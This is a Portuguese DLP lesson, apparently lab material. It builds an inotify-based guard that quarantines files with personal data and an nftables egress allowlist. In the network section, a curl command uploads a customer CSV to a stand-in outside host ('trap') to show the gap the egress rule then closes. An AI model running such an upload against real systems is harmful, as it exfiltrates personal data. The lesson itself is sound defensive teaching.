---
title: No endpoint e na rede
version: 1
---

**Um controle de DLP fica ou onde a ação acontece ou onde o tráfego passa, e os dois veem coisas
diferentes.** No endpoint, o arquivo ainda é legível e a ação tem nome: esta pessoa está copiando
este arquivo para esta pasta. Na rede, o tráfego costuma estar cifrado, mas o tráfego de todas as
máquinas passa pelos mesmos poucos pontos, e uma regra ali não precisa de agente no notebook de
ninguém. Um escritório que se importa faz os dois.

## No endpoint: um guarda no outbox

A maioria dos notebooks tem uma pasta que um cliente de sincronização envia, e o que cai ali sai do
escritório em segundos. Um agente no endpoint vigia o momento em que um arquivo chega, confere e o
retém se trouxer dados pessoais. Este faz o mesmo com o scanner que você já tem. Salve-o no `desk`
como `guard.sh`:

```schooling-example
{"language": "sh", "file": "guard.sh", "parts": [{"code": "#!/bin/bash\n# guard.sh: hold back any file put in ~/outbox that carries personal data.\nOUT=$HOME/outbox\nHELD=$HOME/held\nmkdir -p \"$OUT\" \"$HELD\"", "note": "`~/outbox` faz o papel da pasta que um cliente de sincronização envia, do tipo que todo notebook de empresa tem. O que cai ali sai da empresa em segundos, então é ali que um agente de DLP no endpoint vigia."}, {"code": "inotifywait -m -q -e close_write -e moved_to --format '%f' \"$OUT\" | while read -r name; do", "note": "O `inotifywait` é avisado pelo kernel cada vez que um arquivo da pasta termina de ser gravado ou é movido para dentro dela, então a conferência acontece no momento da ação, e não num horário marcado."}, {"code": "  found=$(python3 \"$HOME/scan.py\" \"$OUT/$name\")\n  if [ -n \"$found\" ]; then\n    mv \"$OUT/$name\" \"$HELD/\"\n    logger -t dlp \"held $name: ${found#*: }\"\n  fi\ndone", "note": "Um arquivo sobre o qual o scanner tenha algo a dizer é movido para `~/held` antes que o cliente de sincronização chegue até ele, e uma linha vai para o log do sistema com o resumo mascarado do scanner. Nada é apagado: um arquivo retido espera uma pessoa decidir."}]}
```

Inicie-o como um serviço próprio, rodando como você:

```
ana@desk:~$ sudo systemd-run --uid=ana --unit dlp-guard bash ~/guard.sh
Running as unit: dlp-guard.service; invocation ID: cabf488a79354fb9b99a8619bb777435
```

Depois ponha dois arquivos no outbox, o memorando e a lista de clientes:

```
ana@desk:~$ sleep 1; cp docs/memo.txt docs/clientes.csv outbox/; sleep 1; ls outbox held
held:
clientes.csv

outbox:
memo.txt
ana@desk:~$ sudo journalctl -t dlp -o cat --no-pager
held clientes.csv: 20 CPF, 20 card, 0 rejected, e.g. 881******41
```

O memorando ficou no outbox, onde um cliente de sincronização o pegaria. A lista de clientes foi
movida para `held` antes que algo pudesse pegá-la, e o log diz por quê, nas palavras mascaradas do
scanner. **Esse é o formato inteiro da DLP no endpoint**: um gancho numa ação, uma conferência de
conteúdo e uma decisão, tudo antes de os dados saírem. Um produto engancha muito mais ações do que
uma pasta, como colar num navegador, imprimir ou copiar para um pendrive, e faz isso a partir do
kernel, como a aula 8 descreveu; a decisão é a mesma.

## Na rede: para onde os dados podem ir

Uma conferência de conteúdo precisa de um arquivo que consiga ler. **Uma regra de destino só precisa
de um endereço**, e funciona sejam quais forem os dados e como quer que estejam cifrados. Antes de
escrever uma, veja o que o `desk` consegue fazer sem ela. No `trap`, abra um shell e inicie este
pequeno receptor, que representa qualquer site fora do escritório que aceite uploads:

```schooling-example
{"language": "python", "file": "recv.py", "parts": [{"code": "#!/usr/bin/env python3\n\"\"\"recv.py: accept any upload and say how many bytes arrived. It stands in for a site outside the company.\"\"\"\nimport http.server\n\nclass Recv(http.server.BaseHTTPRequestHandler):\n    def do_PUT(self):\n        size = len(self.rfile.read(int(self.headers[\"Content-Length\"])))\n        self.send_response(201)\n        self.end_headers()\n        self.wfile.write(f\"received {size} bytes\\n\".encode())\n\nhttp.server.HTTPServer((\"0.0.0.0\", 8443), Recv).serve_forever()", "note": "Dez linhas que aceitam um `PUT` HTTP de qualquer arquivo e o jogam fora depois de contar. No `trap`, ele faz o papel de qualquer lugar fora da empresa para onde um arquivo poderia ser mandado: um e-mail pessoal, um site de compartilhamento, um concorrente."}]}
```

```sh
python3 recv.py
```

Deixe-o rodando ali. A partir do `desk`, mande a lista de clientes para ele:

```
ana@desk:~$ curl -s -T docs/clientes.csv http://trap:8443/
received 951 bytes
```

Todos os 951 bytes do arquivo chegaram. O guarda nunca o viu, porque o `curl` leu o arquivo de
`docs`, não do outbox: **uma conferência no endpoint cobre as ações que engancha e mais nada.** Então
a rede ganha uma regra própria. O trabalho do `desk` precisa do portal e do servidor de nomes; salve
isto como `egress.nft`:

```schooling-example
{"language": "conf", "file": "egress.nft", "parts": [{"code": "table inet egress {\n\tchain output {\n\t\ttype filter hook output priority filter; policy drop;\n\t\toif \"lo\" accept\n\t\tct state established,related accept\n\t\tip daddr 192.168.60.10 tcp dport { 80, 443 } accept\n\t\tip daddr 192.168.60.53 udp dport 53 accept\n\t\tcounter drop comment \"everything else\"\n\t}\n}", "note": "Uma lista do que o `desk` pode começar a conversar: o portal no `web`, o servidor de nomes e as respostas a conversas que outra pessoa começou, como as suas sessões SSH. Toda outra conexão nova é descartada e contada."}]}
```

Carregue e tente os dois destinos de novo:

```
ana@desk:~$ sudo nft -f egress.nft
ana@desk:~$ curl -s -m 3 -T docs/clientes.csv http://trap:8443/; echo "exit $?"
exit 28
ana@desk:~$ curl -s -m 3 http://web/
Jatobá Contabilidade: client portal
ana@desk:~$ sudo nft list chain inet egress output | grep counter
		counter packets 3 bytes 180 drop comment "everything else"
```

O upload para o `trap` esperou três segundos e desistiu, `exit 28`, enquanto o portal continuou
respondendo. O contador mostra os pacotes que a regra descartou: cada nova tentativa da conexão que o
`curl` tentou abrir. Nada na regra sabe o que era o arquivo, e nada precisa saber. **Uma lista de
destinos permitidos é o controle de DLP mais barato que existe**, e a aula 10 faz dela a regra geral
para servidores.

O limite dela é o mesmo que a força: ela conhece endereços, não dados. O portal no `web` é
permitido, então um arquivo enviado num formulário do portal passaria. É aí que a conferência de
conteúdo, no endpoint ou num gateway que consiga ler o tráfego, volta a ter lugar.

```schooling-figure
{"svg": "<svg viewBox=\"0 0 720 250\" role=\"img\" data-fig=\"l09-two-layers\" aria-label=\"Dois controles no desk. Em cima: um arquivo copiado para o outbox encontra o guarda, que roda o scanner e move a lista de clientes para held, então o cliente de sincronização nunca a vê. Embaixo: o curl lê o mesmo arquivo de docs, sem passar pelo guarda, e o envia rumo ao trap; a regra de saída o descarta, enquanto o tráfego para o portal no web é permitido.\"><defs><marker id=\"l09-two-layers-dh-ah-amber\" viewBox=\"0 0 10 8\" refX=\"9\" refY=\"4\" markerWidth=\"8\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0 L10 4 L0 8 z\" fill=\"var(--amber)\"></path></marker><marker id=\"l09-two-layers-dh-ah-paper-dim\" viewBox=\"0 0 10 8\" refX=\"9\" refY=\"4\" markerWidth=\"8\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0 L10 4 L0 8 z\" fill=\"var(--paper-dim)\"></path></marker></defs><text x=\"20.0\" y=\"30.0\" text-anchor=\"start\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10.5\" font-weight=\"600\" fill=\"var(--paper-dim)\">no endpoint: o conteúdo</text><rect x=\"20.0\" y=\"50.0\" width=\"130.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--wire)\" stroke-width=\"1.3\"></rect><text x=\"85.0\" y=\"70.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Mono', monospace\" font-size=\"10\" fill=\"var(--paper)\">outbox/</text><rect x=\"210.0\" y=\"50.0\" width=\"170.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--phosphor)\" stroke-width=\"1.5\"></rect><text x=\"295.0\" y=\"70.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10\" fill=\"var(--paper)\">guarda: scan.py</text><rect x=\"450.0\" y=\"50.0\" width=\"110.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--amber)\" stroke-width=\"1.3\"></rect><text x=\"505.0\" y=\"70.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Mono', monospace\" font-size=\"10\" fill=\"var(--paper)\">held/</text><path d=\"M150.0 70.0 L210.0 70.0\" stroke=\"var(--paper-dim)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-paper-dim)\"></path><path d=\"M380.0 70.0 L450.0 70.0\" stroke=\"var(--amber)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-amber)\"></path><text x=\"415.0\" y=\"98.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9\" fill=\"var(--amber)\">dados pessoais</text><text x=\"20.0\" y=\"140.0\" text-anchor=\"start\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10.5\" font-weight=\"600\" fill=\"var(--paper-dim)\">na rede: o destino</text><rect x=\"20.0\" y=\"160.0\" width=\"130.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--wire)\" stroke-width=\"1.3\"></rect><text x=\"85.0\" y=\"180.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Mono', monospace\" font-size=\"10\" fill=\"var(--paper)\">curl -T docs/…</text><rect x=\"210.0\" y=\"160.0\" width=\"170.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--phosphor)\" stroke-width=\"1.5\"></rect><text x=\"295.0\" y=\"180.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10\" fill=\"var(--paper)\">lista de saída</text><rect x=\"450.0\" y=\"140.0\" width=\"110.0\" height=\"34.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--wire)\" stroke-width=\"1.3\"></rect><text x=\"505.0\" y=\"157.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--paper)\">web: permitido</text><rect x=\"450.0\" y=\"190.0\" width=\"110.0\" height=\"34.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--amber)\" stroke-width=\"1.3\" stroke-dasharray=\"5 3\"></rect><text x=\"505.0\" y=\"207.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--amber)\">trap: descartado</text><path d=\"M150.0 180.0 L210.0 180.0\" stroke=\"var(--paper-dim)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-paper-dim)\"></path><path d=\"M380.0 172.0 L450.0 157.0\" stroke=\"var(--paper-dim)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-paper-dim)\"></path><path d=\"M380.0 188.0 L450.0 207.0\" stroke=\"var(--amber)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-amber)\"></path><text x=\"640.0\" y=\"120.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--paper-dim)\">o upload nunca</text><text x=\"640.0\" y=\"135.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--paper-dim)\">passou pelo guarda</text></svg>", "caption": "O guarda lê o que entra numa pasta. A lista de saída só lê para onde o tráfego vai."}
```
